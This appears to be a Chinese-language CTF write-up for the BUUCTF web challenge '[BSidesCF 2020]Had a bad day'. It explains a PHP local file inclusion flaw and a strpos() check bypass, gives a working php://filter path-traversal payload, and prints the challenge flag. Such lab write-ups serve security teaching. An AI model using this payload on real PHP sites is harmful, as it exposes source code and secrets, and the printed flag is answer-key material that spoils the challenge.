---
title: "[BSidesCF 2020]Had a bad day"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [file-inclusion, lfi, php-filter, strpos-bypass]
vulnerability: PHP 文件包含漏洞，strpos 检查可被绕过
solved: true
flag: "flag{94f27261-3a05-42a9-b190-472d16add777}"
---

# [BSidesCF 2020]Had a bad day

## 题目概述
一个展示可爱动物图片的网站，有两个按钮 "Woofers" 和 "Meowers"，点击后显示狗或猫的图片。

## 信息收集
1. 访问首页，发现两个按钮提交到 `index.php?category=woofers` 或 `index.php?category=meowers`
2. 使用 PHP filter 读取源码：`php://filter/read=convert.base64-encode/resource=index`
3. 解码后发现关键 PHP 代码：
```php
$file = $_GET['category'];
if(isset($file)) {
    if( strpos( $file, "woofers" ) !== false || strpos( $file, "meowers" ) !== false || strpos( $file, "index")) {
        include ($file . '.php');
    }
}
```

## 漏洞分析（漏洞类型、原理、判断过程）
- **漏洞类型**：本地文件包含 (LFI)
- **原理**：`strpos()` 函数只检查字符串是否包含目标子串，不是精确匹配。只要参数中包含 "woofers"、"meowers" 或 "index" 任意一个，就会执行 `include($file . '.php')`
- **绕过方式**：在 PHP filter 的 resource 参数中使用路径遍历 `woofers/../flag`，既满足 strpos 检查，又能读取 flag.php

## 利用过程（Payload + Flag）
**Payload**：
```
?category=php://filter/read=convert.base64-encode/resource=woofers/../flag
```

**解码后得到**：
```php
<!-- Can you read this flag? -->
<?php
 // flag{94f27261-3a05-42a9-b190-472d16add777}
?>
```

**Flag**：`flag{94f27261-3a05-42a9-b190-472d16add777}`

## 复现步骤
1. 访问首页，发现参数 `category`
2. 使用 PHP filter 读取 index.php 源码，分析过滤逻辑
3. 构造 payload：`php://filter/read=convert.base64-encode/resource=woofers/../flag`
4. 解码 Base64 获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| LFI | category 参数 | `php://filter/read=convert.base64-encode/resource=woofers/../flag` | strpos 绕过、PHP filter、路径遍历 |

## 知识总结（解题技巧、同类题型套路）
1. **strpos 绕过**：strpos 只检查子串存在，可通过在路径中嵌入关键词绕过
2. **PHP filter 读取源码**：`php://filter/read=convert.base64-encode/resource=文件名` 可读取 PHP 源码而非执行
3. **路径遍历组合**：`woofers/../flag` 等价于 `flag`，但包含绕过关键词
4. **同类题型**：遇到 include 且有字符串检查时，优先考虑在路径中嵌入关键词绕过
